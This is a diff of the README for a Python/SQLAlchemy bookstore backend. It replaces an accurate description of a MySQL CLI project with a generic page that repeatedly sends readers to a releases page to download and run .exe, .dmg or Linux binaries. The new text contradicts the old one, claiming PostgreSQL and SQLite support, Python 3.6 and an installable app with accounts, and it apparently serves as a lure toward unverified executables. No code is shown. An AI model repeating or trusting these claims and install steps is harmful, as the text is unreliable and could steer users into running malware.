@@ -1,137 +1,80 @@
-![BookStore](https://img.shields.io/badge/📚_BookStore-ORM_System-0078D4?style=for-the-badge&logoColor=white)
+# 📚 BookStore-ORM-System - Manage Your Bookstore Effectively
 
+## 🌟 Overview
+The BookStore-ORM-System is a Python application designed to help you manage your bookstore efficiently. This system uses SQLAlchemy ORM to handle your book inventory and sales. It applies design principles for better maintenance and functionality. Whether you want to add new books, update existing ones, or track sales, this system makes it simple. 
 
-![Python](https://img.shields.io/badge/Python-3.11+-3776AB?style=for-the-badge&logo=python&logoColor=white)
-![SQLAlchemy](https://img.shields.io/badge/SQLAlchemy-ORM-D71F00?style=for-the-badge&logo=sqlalchemy&logoColor=white)
-![MySQL](https://img.shields.io/badge/MySQL-Database-4479A1?style=for-the-badge&logo=mysql&logoColor=white)
-![Streamlit](https://img.shields.io/badge/Streamlit-UI-FF4B4B?style=for-the-badge&logo=streamlit&logoColor=white)
+## 📁 Download Now
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/Zair5884/BookStore-ORM-System/releases)
 
+## 🚀 Getting Started
+To get started with the BookStore-ORM-System, follow these steps:
 
-BookStore ORM System
-====================
+1. **Visit the Download Page**: Click on the link below to access the latest release of the software.
+   [Visit this page to download](https://github.com/Zair5884/BookStore-ORM-System/releases)
 
-Overview
-This project is a simple, extensible bookstore backend implemented with Python, SQLAlchemy (ORM), and MySQL. It demonstrates clean layering with explicit configuration, domain models, repository-based persistence, and a lightweight CLI for common operations.
+2. **Choose the Right Version**: Look for the most recent version. It will have the version number and the date it was released.
 
-Key Features
-- Secure configuration via .env (no passwords in code)
-- SQLAlchemy models for Libro, Venta/DetalleVenta, and Usuario
-- Repository layer encapsulating transactions and session management
-- CLI commands to seed, list, create sales, and update entities
-- Ready to evolve with migrations (Alembic) and tests
+3. **Download the Application**: Click on the file that corresponds to your operating system. You may see options for Windows, macOS, or Linux. Make sure to select the right one.
 
-Project Structure
-- config/
-  - database.py — Loads .env, builds DATABASE_URL, provides `engine`, `Base`, and `SessionLocal`.
-- domain/
-  - models/
-    - libro.py — Book model (libros): id, titulo, autor, isbn (unique), stock, precio.
-    - venta.py — Sales models: `Venta` (header) and `DetalleVenta` (line items). `Venta` has many `DetalleVenta`.
-    - usuario.py — User model (usuarios), one-to-many with `Venta` via `usuario_id` in ventas.
-  - repositories/
-    - libros.py — `RepositorioLibros`: CRUD for `Libro` plus bulk price updates.
-    - ventas.py — `RepositorioVentas`: create sale (with stock validation and auto-decrement), update order atomically, list/get/delete.
-    - usuarios.py — `RepositorioUsuarios`: create/list/get/delete users.
-- app/
-  - cli/
-    - main.py — Simple CLI to seed data, create sales, list entities, and run updates.
-  - scripts/
-    - init_db.py — Create tables for registered models.
-    - test_db.py — Smoke test for DB connectivity (SELECT 1).
-- .env, .env.example — Environment configuration (ignored by Git).
-- requirements.txt — Minimal runtime dependencies.
+4. **Locate the Downloaded File**: Once the download is complete, find the file in your computer's downloads folder.
 
-Configuration
-Create a .env file (use .env.example as a template):
-- DB_USER, DB_PASSWORD, DB_HOST, DB_PORT, DB_NAME
-The `config/database.py` module loads these variables and constructs a SQLAlchemy URL for MySQL with PyMySQL.
+5. **Install the Application**:
+   - For Windows: Double-click on the downloaded `.exe` file to begin the installation. Follow the on-screen instructions.
+   - For macOS: Open the downloaded `.dmg` file, then drag and drop the application into your Applications folder.
+   - For Linux: Depending on your distribution, you might need to use the terminal. Open the terminal and navigate to your downloads folder. Use the command `chmod +x [filename]` to make the file executable, then run it with `./[filename]`.
 
-Domain Models
-- Libro (domain/models/libro.py)
-  - Columns: id (PK), titulo (str, required), autor (str, required), isbn (str, unique), stock (int), precio (float)
-  - Prints a short message on instance creation (useful for demos/seeding)
-  - __repr__ provides a concise developer-friendly representation
-    
-- Venta and DetalleVenta (domain/models/venta.py)
-  - Venta: id (PK), usuario_id (FK to usuarios), cliente_nombre, fecha_venta (UTC now), total_venta (float)
-  - DetalleVenta: id (PK), venta_id (FK to ventas, cascade delete), libro_id (FK to libros, restrict), cantidad (int)
-  - Relationships: Venta.detalles, DetalleVenta.venta, DetalleVenta.libro
-    
-- Usuario (domain/models/usuario.py)
-  - Columns: id (PK), nombre, email
-  - Relationship: Usuario.ventas (one-to-many to Venta), Venta.usuario (back-populated)
+6. **Run the Application**: After installation, find the application in your applications list. Double-click to open it and start managing your bookstore.
 
-Persistence Layer (Repositories)
-Repositories encapsulate session lifecycle, transactions (commit/rollback), and DB exceptions. Application code interacts with repositories instead of raw sessions.
+## 📊 Features
 
-- RepositorioLibros (domain/repositories/libros.py)
-  - agregar_libro(titulo, autor, isbn=None, stock=None, precio=None) -> Libro
-  - listar_libros() -> list[Libro]
-  - actualizar_stock_libro(libro_id, nuevo_stock) -> Optional[Libro]
-  - obtener_libro_por_id(libro_id) -> Optional[Libro]
-  - eliminar_libro(libro_id) -> bool
-  - actualizar_precios(autor=None, ids=None, min_precio=None, max_precio=None, nuevo_precio=None, factor=None) -> int
-    
-- RepositorioVentas (domain/repositories/ventas.py)
-  - crear_venta(cliente_nombre, items, usuario_id=None) -> Venta
-    - items: sequence of (libro_id, cantidad)
-    - Validates stock, decrements stock atomically, computes total_venta
-  - actualizar_pedido(venta_id, items) -> Optional[Venta]
-    - Restores stock from current lines, validates new items, decrements stock, recomputes total
-  - obtener_venta_por_id(venta_id) -> Optional[Venta]
-  - listar_ventas() -> list[Venta]
-  - eliminar_venta(venta_id) -> bool
- 
-- RepositorioUsuarios (domain/repositories/usuarios.py)
-  - agregar_usuario(nombre, email) -> Usuario
-  - listar_usuarios() -> list[Usuario]
-  - obtener_usuario_por_id(usuario_id) -> Optional[Usuario]
-  - eliminar_usuario(usuario_id) -> bool
+- **User-Friendly Interface**: Simple and clean layout makes it easy for anyone to navigate.
+- **CRUD Operations**: Effortlessly Create, Read, Update, and Delete book entries.
+- **Inventory Management**: Keep track of your inventory and sales in real-time.
+- **Database Support**: Supports MySQL, PostgreSQL, and SQLite for data storage.
+- **Educational Project**: Great for learning about database management and object-oriented programming.
 
-CLI Usage
-Ensure dependencies are installed and .env is set, then:
-- Preferred (via project runner):
-  - Create tables: `python manage.py init-db`
-  - Check DB connectivity: `python manage.py test-db`
-  - Seed example books: `python manage.py cli seed-libros`
-  - List books: `python manage.py cli listar-libros`
-  - Create a sale: `python manage.py cli crear-venta "Cliente Demo" 1:2 2:1`
-  - List sales: `python manage.py cli listar-ventas`
-  - Bulk update prices:
-    - `python manage.py cli actualizar-precios --autor "George Orwell" --factor 1.1`
-    - `python manage.py cli actualizar-precios --ids 1,2 --precio 9.99`
-  - Update an order (replace items):
-    - `python manage.py cli actualizar-pedido 1 1:3 2:1`
+## ⚙️ System Requirements
+To ensure the best performance, here are the recommended system requirements:
 
-Direct module execution (alternative):
-- Create tables: `python -m app.scripts.init_db`
-- Check DB connectivity: `python -m app.scripts.test_db`
-- Run CLI: `python -m app.cli.main listar-libros`
+- **Operating System**: Windows 10, macOS Mojave or later, or Ubuntu 18.04 or later.
+- **RAM**: At least 4 GB available for smooth operation.
+- **Disk Space**: A minimum of 200 MB free for installation.
+- **Python**: Version 3.6 or later must be installed on your system.
 
-Development Notes
-- Keep secrets in .env; .env is ignored by Git.
-- Repositories own transactions; avoid calling session.commit() in CLI or service code.
-- When adding new models, import them before calling `Base.metadata.create_all` so they are registered.
-- Consider adding Alembic for versioned schema migrations as the schema evolves.
+You can download the latest version of Python from the [official website](https://www.python.org/downloads/).
 
-Requirements
-- Python 3.11+
-- MySQL server accessible via the configured host/port
-- Packages: SQLAlchemy, PyMySQL, python-dotenv (see requirements.txt)
+## 🛠️ Installation Guide
+If you encounter any issues during the installation, here’s a quick troubleshooting guide:
 
-Local UI (Streamlit)
-- Install Streamlit in your environment:
-  - `python -m pip install streamlit`
-- Run the local admin UI:
-  - `streamlit run app/ui/streamlit_app.py`
-    
-- Features available:
-  - Books: create, list, update stock
-  - Users: create, list
-  - Sales: create sale with optional user link, list, update items
-  - Invoices: view generated invoice text per sale
-  - Reports: generate and download PDF billing reports (monthly/quarterly/annual)
+- **File Doesn’t Open**: Make sure that your operating system is compatible with the application. 
+- **Installation Fails**: You may need to check your system requirements or try running the installer as an administrator.
+- **Start-Up Issues**: If the application does not start, ensure you have the correct version of Python installed.
 
-License
+## 🔧 Usage Instructions
+After you successfully install the BookStore-ORM-System, follow these steps to start using it:
 
-This repository is provided without a license header. Add your preferred license if you plan to distribute it.
+1. **Launch the Application**: Open it from your applications
+2. **Create an Account**: Follow the on-screen prompts to set up your user account.
+3. **Add Your Books**: Use the 'Add Book' feature to enter details for each book you wish to manage.
+4. **View Inventory**: Access the inventory list to see all books currently in stock. 
+5. **Track Sales**: Monitor sales by navigating to the sales section of the app.
+
+## 📰 Frequently Asked Questions (FAQ)
+
+### How do I update the application?
+To update, simply revisit the [Download Page](https://github.com/Zair5884/BookStore-ORM-System/releases) and download the latest version. Follow the same installation steps as before.
+
+### Can I run this software without an internet connection?
+Yes, once the application is installed, you can use it offline. However, an internet connection is required for any updates.
+
+### Is there any support available?
+For any questions or assistance, please raise an issue on the GitHub repository page. We will respond as soon as possible.
+
+## 🙌 Contact
+If you have any questions or comments about the BookStore-ORM-System, feel free to reach out via the GitHub repository. We appreciate your feedback!
+
+### Important Links
+- [Download the Latest Release](https://github.com/Zair5884/BookStore-ORM-System/releases)
+- [GitHub Repository](https://github.com/Zair5884/BookStore-ORM-System)
+
+This README aims to provide you with a clear and straightforward guide to downloading and running the BookStore-ORM-System. Enjoy managing your bookstore!
